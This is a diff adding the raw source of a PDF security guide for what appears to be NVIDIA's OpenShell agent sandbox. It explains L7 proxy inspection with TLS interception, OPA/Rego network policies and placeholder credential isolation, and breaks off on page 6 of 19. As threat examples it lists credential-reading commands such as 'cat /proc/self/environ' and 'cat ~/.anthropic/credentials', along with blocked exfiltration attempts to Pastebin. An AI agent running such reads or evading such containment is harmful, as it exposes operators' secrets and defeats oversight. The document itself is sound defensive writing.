@@ -1,0 +1,3900 @@
+%PDF-1.4
+%‚„œ”
+1 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+2 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>
+endobj
+3 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Courier >>
+endobj
+4 0 obj
+<< /Length 3201 >>
+stream
+BT
+/F2 20 Tf
+1 0 0 1 54 732 Tm
+(OpenShell Security Concepts ? Deep Dive) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 698 Tm
+(A detailed explanation of the advanced security concepts used in NVIDIA OpenShell, with) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 683 Tm
+(architecture details, key concepts, example scenarios, and how each mechanism protects) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 668 Tm
+(against real-world agent threats.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 637 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 619 Tm
+(Table of Contents) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 591 Tm
+(1. L7 Network Inspection \(HTTP Proxy + OPA/Rego\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 576 Tm
+(   \(#1-l7-network-inspection-http-proxy--oparego\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 555 Tm
+(2. Credential Isolation \(#2-credential-isolation\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 534 Tm
+(3. Per-Binary Network Policy \(#3-per-binary-network-policy\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 513 Tm
+(4. SSRF Prevention \(#4-ssrf-prevention\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 492 Tm
+(5. Binary Integrity \(SHA256 TOFU\) \(#5-binary-integrity-sha256-tofu\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 471 Tm
+(6. Cross-Platform Support \(#6-cross-platform-support\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 450 Tm
+(7. How These Concepts Work Together \(#7-how-these-concepts-work-together\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 423 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 405 Tm
+(1. L7 Network Inspection \(HTTP Proxy + OPA/Rego\)) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 377 Tm
+(The Problem) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 354 Tm
+(Traditional network enforcement works at Layer 4 \(L4\) ? it sees IP addresses and port) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 339 Tm
+(numbers. A firewall rule like "allow port 443" permits all HTTPS traffic to any host on) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 324 Tm
+(that port. But an AI agent talking to api.openai.com:443 could be:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 299 Tm
+(- GET /v1/models ? harmless, listing available models) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 278 Tm
+(- POST /v1/chat/completions ? expected, running inference) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 257 Tm
+(- POST /v1/files ? uploading your private code to OpenAI's file storage) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 236 Tm
+(- DELETE /v1/fine_tuning/jobs/ftjob-abc123 ? destroying a fine-tuning job) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 215 Tm
+(All four hit the same host and port. L4 enforcement cannot distinguish them. An AI agent) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 200 Tm
+(with a simple "allow port 443" rule has unrestricted access to every API endpoint on) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 185 Tm
+(every HTTPS service on the internet.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 160 Tm
+(Key Concept: OSI Network Layers) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 137 Tm
+(Layer 7 \(Application\):  HTTP method, path, headers, body) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 125 Tm
+(Layer 6 \(Presentation\): TLS/SSL encryption) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 113 Tm
+(Layer 5 \(Session\):      Connection management) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 101 Tm
+(Layer 4 \(Transport\):    TCP port numbers \(e.g., 443\)) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 1 of 19) Tj
+ET
+endstream
+endobj
+5 0 obj
+<< /Length 3712 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(Layer 3 \(Network\):      IP addresses \(e.g., 104.18.7.192\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(Layer 2 \(Data Link\):    MAC addresses) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(Layer 1 \(Physical\):     Electrical signals) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 688 Tm
+(L4 enforcement \(what Guardian Shell's eBPF does\) sees only layers 3-4: the IP and port) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 673 Tm
+(of the connect\(\) syscall. L7 enforcement \(what OpenShell's proxy does\) can see the HTTP) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 658 Tm
+(method, URL path, headers, and even the request body ? the actual intent of the request.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 633 Tm
+(How OpenShell Implements L7 Inspection) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 610 Tm
+(OpenShell forces all agent network traffic through an HTTP CONNECT proxy running at) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 595 Tm
+(10.200.0.1:3128 on the host side of a veth pair. The agent sits in an isolated network) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 580 Tm
+(namespace where the proxy is the only reachable destination.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 555 Tm
+(Connection flow:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 530 Tm
+(Agent process \(in sandbox\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 518 Tm
+(    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 506 Tm
+(    ?  connect\(\) to api.openai.com:443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 494 Tm
+(    ?  \(routed through veth to 10.200.0.1\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 482 Tm
+(    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 470 Tm
+(    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 458 Tm
+(???????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 446 Tm
+(?  HTTP CONNECT Proxy \(10.200.0.1:3128\)       ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 434 Tm
+(?                                             ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 422 Tm
+(?  1. Receive: CONNECT api.openai.com:443     ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 410 Tm
+(?  2. Identify calling binary via /proc       ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 398 Tm
+(?  3. Evaluate OPA/Rego policy \(L4 decision\)  ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 386 Tm
+(?  4. DNS resolve ? SSRF check               ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 374 Tm
+(?  5. Auto-detect TLS \(peek first 8 bytes\)    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 362 Tm
+(?  6. TLS-terminate client side \(ephemeral CA\)?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 350 Tm
+(?  7. Parse HTTP request from decrypted stream?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 338 Tm
+(?  8. Evaluate OPA/Rego policy \(L7 decision\)  ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 326 Tm
+(?  9. Forward to real api.openai.com:443      ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 314 Tm
+(?     \(re-encrypted with real server cert\)    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 302 Tm
+(???????????????????????????????????????????????) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 282 Tm
+(Step 5-6 is the critical part ? TLS interception:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 257 Tm
+(The proxy peeks at the first 8 bytes of the tunnel. If it sees 0x16 0x03 0x0X \(a TLS) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 242 Tm
+(ClientHello\), it knows the client is starting a TLS handshake. The proxy then:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 217 Tm
+(1. Generates a leaf certificate for api.openai.com signed by a per-sandbox) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 196 Tm
+(ephemeral CA \(ECDSA P-256, via the rcgen crate\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 171 Tm
+(2. Presents this certificate to the agent \(the agent trusts the sandbox CA) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 150 Tm
+(because it's injected into SSL_CERT_FILE, NODE_EXTRA_CA_CERTS, etc.\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 125 Tm
+(3. Decrypts the HTTP request ? now the proxy sees plaintext HTTP) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 104 Tm
+(4. Evaluates L7 policy rules against method + path) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 2 of 19) Tj
+ET
+endstream
+endobj
+6 0 obj
+<< /Length 4063 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(5. Re-encrypts and forwards to the real server using the real server's certificate) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 711 Tm
+(This is the same technique corporate TLS inspection proxies use, but scoped to a single) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 696 Tm
+(sandbox with an ephemeral CA that exists only in memory.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 671 Tm
+(Key Concept: OPA/Rego Policy Engine) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 648 Tm
+(OPA \(Open Policy Agent\) is a general-purpose policy engine. Rego is its query language.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 633 Tm
+(OpenShell embeds a pure-Rust OPA implementation \(regorus crate\) ? no external OPA daemon) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 618 Tm
+(needed.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 593 Tm
+(How policy evaluation works:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 568 Tm
+(Input \(per-connection\):                Rego Rules:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 556 Tm
+(????????????????????????????          ??????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 544 Tm
+(? host: "api.openai.com"   ?          ? allow_network = true {            ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 532 Tm
+(? port: 443                ?  ??????? ?   some endpoint in endpoints      ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 520 Tm
+(? binary_path: "/usr/bin/  ?          ?   glob.match\(endpoint.host,       ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 508 Tm
+(?   node"                  ?          ?     ["."], input.host\)            ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 496 Tm
+(? binary_sha256: "a1b2..." ?          ?   input.port in endpoint.ports    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 484 Tm
+(? ancestors: ["/usr/bin/   ?          ?   binary_matches\(endpoint, input\) ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 472 Tm
+(?   bash", ...]            ?          ? }                                 ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 460 Tm
+(? cmdline_paths: ["/usr/   ?          ??????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 448 Tm
+(?   local/bin/claude"]     ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 436 Tm
+(????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 412 Tm
+(Input \(per-request, L7\):              Rego Rules:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 400 Tm
+(????????????????????????????          ??????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 388 Tm
+(? method: "POST"           ?          ? allow_request = true {            ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 376 Tm
+(? path: "/v1/chat/         ?  ??????? ?   some rule in endpoint.rules     ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 364 Tm
+(?   completions"           ?          ?   method_matches\(rule, input\)     ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 352 Tm
+(? host: "api.openai.com"   ?          ?   path_matches\(rule, input\)       ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 340 Tm
+(????????????????????????????          ? }                                 ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 328 Tm
+(                                      ??????????????????????????????????????) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 308 Tm
+(Example YAML policy:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 283 Tm
+(network_policies:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 271 Tm
+(  allow-inference:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 259 Tm
+(    endpoints:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 247 Tm
+(      - host: "api.openai.com") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 235 Tm
+(        port: 443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 223 Tm
+(        protocol: https) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 211 Tm
+(        rules:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 199 Tm
+(          - methods: ["POST"]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 187 Tm
+(            paths: ["/v1/chat/completions"]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 175 Tm
+(          - methods: ["GET"]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 163 Tm
+(            paths: ["/v1/models"]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 151 Tm
+(    binaries:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 139 Tm
+(      - path: "/usr/local/bin/claude") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 115 Tm
+(  allow-github-readonly:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 103 Tm
+(    endpoints:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 91 Tm
+(      - host: "api.github.com") Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 3 of 19) Tj
+ET
+endstream
+endobj
+7 0 obj
+<< /Length 3146 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(        port: 443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(        protocol: https) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(        rules:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(          - methods: ["GET"]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(            paths: ["/repos/**"]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(    binaries:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(      - path: "/usr/bin/git") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(      - path: "/usr/bin/curl") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 628 Tm
+(This says:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 603 Tm
+(- Only claude can call OpenAI, and only the chat completions and models endpoints) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 582 Tm
+(- Only git and curl can call GitHub, and only for read-only \(GET\) operations) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 561 Tm
+(- Everything else is denied) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 540 Tm
+(Access presets simplify common patterns:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 515 Tm
+(endpoints:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 503 Tm
+(  - host: "api.github.com") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 491 Tm
+(    port: 443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 479 Tm
+(    access: read-only    # Expands to GET, HEAD, OPTIONS) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 459 Tm
+(read-only expands to methods: ["GET", "HEAD", "OPTIONS"] with paths: ["**"]. read-write) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 444 Tm
+(adds POST, PUT, PATCH, DELETE. full allows everything.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 419 Tm
+(Example Scenarios) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 396 Tm
+(Scenario 1: Agent tries to exfiltrate code to Pastebin) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 371 Tm
+(Agent: CONNECT pastebin.com:443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 359 Tm
+(Proxy: OPA check ? host "pastebin.com" not in any policy endpoint ? DENY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 347 Tm
+(Agent: receives 403 Forbidden) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 327 Tm
+(The agent never reaches the internet. Without L7, a port-443 allow rule would have let) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 312 Tm
+(this through.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 287 Tm
+(Scenario 2: Agent tries to upload files to OpenAI) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 262 Tm
+(Agent: CONNECT api.openai.com:443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 250 Tm
+(Proxy: OPA L4 check ? host matches "allow-inference" policy ? ALLOW \(L4\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 238 Tm
+(Proxy: TLS intercept ? reads HTTP request) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 226 Tm
+(Agent: POST /v1/files) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 214 Tm
+(Proxy: OPA L7 check ? method POST, path /v1/files ? NOT in allowed paths) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 202 Tm
+(        \(only /v1/chat/completions and /v1/models allowed\) ? DENY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 190 Tm
+(Agent: receives 403 Forbidden) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 170 Tm
+(The L4 check passed \(correct host and port\), but the L7 check caught the unauthorized) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 155 Tm
+(API endpoint.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 130 Tm
+(Scenario 3: Agent legitimately calls inference) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 105 Tm
+(Agent: CONNECT api.openai.com:443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 93 Tm
+(Proxy: OPA L4 check ? ALLOW) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 4 of 19) Tj
+ET
+endstream
+endobj
+8 0 obj
+<< /Length 3136 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(Proxy: TLS intercept ? reads HTTP request) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(Agent: POST /v1/chat/completions {"model": "gpt-4", ...}) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(Proxy: OPA L7 check ? method POST, path /v1/chat/completions ? ALLOW) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(Proxy: Forward to real api.openai.com:443 with re-encrypted TLS) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 676 Tm
+(What Guardian Shell sees for the same scenario:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 651 Tm
+(eBPF sys_enter_connect: pid=12345, addr=104.18.7.192, port=443 ? ALLOW \(port 443 allowed\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 631 Tm
+(Guardian Shell sees only the IP and port. It cannot distinguish the three scenarios) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 616 Tm
+(above ? they all look like "connect to port 443".) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 591 Tm
+(Why This Matters) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 568 Tm
+(Modern AI agents interact with dozens of APIs: inference providers, code hosting,) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 553 Tm
+(package registries, search engines, databases. L7 inspection lets you define policies) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 538 Tm
+(like:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 513 Tm
+(- "Agent can read from GitHub but not push code") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 492 Tm
+(- "Agent can call inference but not upload training data") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 471 Tm
+(- "Agent can query npm registry but not publish packages") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 450 Tm
+(- "Agent can read from S3 but not delete objects") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 429 Tm
+(Without L7 inspection, you can only say "agent can/cannot reach this host:port" ? which) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 414 Tm
+(is too coarse for meaningful API security.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 383 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 365 Tm
+(2. Credential Isolation) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 337 Tm
+(The Problem) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 314 Tm
+(AI agents need API keys to function ? calling inference APIs, accessing code) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 299 Tm
+(repositories, authenticating with services. The standard approach is setting environment) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 284 Tm
+(variables \(ANTHROPIC_API_KEY=sk-ant-...\) or writing config files) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 269 Tm
+(\(~/.config/gh/hosts.yml\).) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 244 Tm
+(This is dangerous because:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 219 Tm
+(1. The agent can read its own environment: cat /proc/self/environ) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 198 Tm
+(2. The agent can read config files: cat ~/.anthropic/credentials) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 177 Tm
+(3. A compromised agent can exfiltrate these credentials to an attacker) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 156 Tm
+(4. The agent can use credentials for unintended purposes \(e.g., using an API key) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 135 Tm
+(meant for inference to create fine-tuning jobs or upload files\)) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 110 Tm
+(Key Concept: Placeholder Credential Injection) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 5 of 19) Tj
+ET
+endstream
+endobj
+9 0 obj
+<< /Length 4126 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(OpenShell never gives the agent real credentials. Instead, it uses a placeholder ? real) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 717 Tm
+(credential substitution system at the proxy layer.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 692 Tm
+(The mechanism:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 667 Tm
+(                     Outside sandbox              Inside sandbox) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 655 Tm
+(                     \(real credentials\)           \(placeholders only\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 631 Tm
+(Environment:         ANTHROPIC_API_KEY=           ANTHROPIC_API_KEY=) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 619 Tm
+(                     "sk-ant-real-key-xyz"        "openshell:resolve:env:ANTHROPIC_API_KEY") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 595 Tm
+(When agent makes                                  Authorization: Bearer) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 583 Tm
+(HTTP request:                                     openshell:resolve:env:ANTHROPIC_API_KEY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 571 Tm
+(                                                         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 559 Tm
+(                                                         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 547 Tm
+(                                              ???????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 535 Tm
+(                                              ?  Proxy intercepts   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 523 Tm
+(                                              ?  Replaces:          ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 511 Tm
+(                                              ?  openshell:resolve: ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 499 Tm
+(                                              ?  env:ANTHROPIC_     ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 487 Tm
+(                                              ?  API_KEY            ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 475 Tm
+(                                              ?       ?             ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 463 Tm
+(                                              ?  sk-ant-real-key-   ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 451 Tm
+(                                              ?  xyz                ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 439 Tm
+(                                              ???????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 427 Tm
+(                                                         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 415 Tm
+(                                                         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 403 Tm
+(                                              Request forwarded to) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 391 Tm
+(                                              api.anthropic.com with) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 379 Tm
+(                                              real key) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 359 Tm
+(Implementation detail:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 334 Tm
+(1. SecretResolver::from_provider_env\(\) takes real credentials and returns:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 313 Tm
+(- A child_env map with placeholder values for the agent's environment - A resolver that) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 298 Tm
+(maps placeholders back to real values) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 273 Tm
+(2. Agent process is spawned with placeholder environment variables) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 252 Tm
+(3. When the agent makes an HTTP request, the proxy's rewrite_http_header_block\(\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 231 Tm
+(scans headers for openshell:resolve:env:* patterns and replaces them inline) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 206 Tm
+(4. The real key exists only in the proxy's memory ? never on the filesystem, never) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 185 Tm
+(in the agent's process memory \(the env var contains only the placeholder\)) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 160 Tm
+(Key Concept: Inference Router \(inference.local\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 137 Tm
+(OpenShell provides a virtual hostname inference.local that agents use instead of calling) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 122 Tm
+(provider APIs directly. This adds a second layer of credential isolation.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 97 Tm
+(Agent code:) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 6 of 19) Tj
+ET
+endstream
+endobj
+10 0 obj
+<< /Length 3770 >>
+stream
+BT
